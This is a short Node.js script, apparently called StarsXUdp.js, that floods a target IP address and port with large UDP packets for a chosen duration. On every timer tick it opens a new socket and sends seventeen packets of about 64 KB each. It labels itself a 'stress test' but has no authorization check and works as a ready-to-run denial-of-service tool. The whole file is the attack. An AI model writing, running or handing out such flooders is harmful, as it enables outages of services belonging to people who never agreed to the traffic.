const dgram = require('dgram');

if (process.argv.length <= 4) {
    console.log("Usage: node StarsXUdp.js <target_ip> <target_port> <duration_seconds>");
    process.exit(-1);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);

function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('0x00');
    return payload;
}

const payload = generatePayload(65500);

let int = setInterval(() => {
    const socket = dgram.createSocket('udp4');
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target)
    socket.send(payload, 0, payload.length, port, target, (err) => {
        if (err) {
            console.error('Error sending message:', err);
        }
        socket.close();
    });
});

setTimeout(() => {
    clearInterval(int);
    console.log('Stress test stopped');
}, duration * 1000);
